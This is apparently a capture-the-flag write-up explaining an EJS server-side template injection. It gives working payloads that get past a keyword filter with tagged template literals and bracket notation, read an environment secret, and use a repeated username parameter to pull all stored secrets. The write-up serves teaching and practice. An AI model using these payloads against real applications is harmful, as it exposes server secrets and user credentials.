# Challenge

Get `robertf` secret key and validate it with the /checkKeyValidity endpoint

# Solution

Essentially, they aren't filtering out the `global` keyword. 

These are a few of the strings that are filtered:

 - `process`
 - `env`
 - `(`

They are using `ejs` to render a user controlled template (which is provided via the `profileMessage` query param). 

Since they are filtering `(`, you have to use tagged template literals (essentially, calling a function using backticks in place of parentheses) to call ` .toLowerCase`` ` on `PROCESS` and `ENV`..

Since we can also use bracket notation (vs dot notation) to access properties/fields of an object, that helps make calling tagged template literals easier..

Therefore, the following:

```js
global["PROCESS".toLowerCase``]["ENV".toLowerCase``]["superAdminCode"]
```

... will become:

```js
global["process"]["env"]["superAdminCode"]
// the dot notation equivalent is:
// global.process.env.superAdminCode
```

...which, is valid and will not be filtered. Rather, executed.

After we have the `superAdminCode` we need to send a request with multiple usernames in order to hit a specific condition. From there it returns all profiles with secrets, which we can then send to the second endpoint.

The trick is you have to have to provide a valid username to get the results, meaning you have to send a scriplet tag to either override the `name` variable or just use a new variable..

```js
url.com/profileName?username=robertf&username=robertf&key=bar&profileMessage=<% const g = global["PROCESS".toLowerCase``]["ENV".toLowerCase``]["superAdminCode"]; %><%- name %><%- ` ${g}` %>
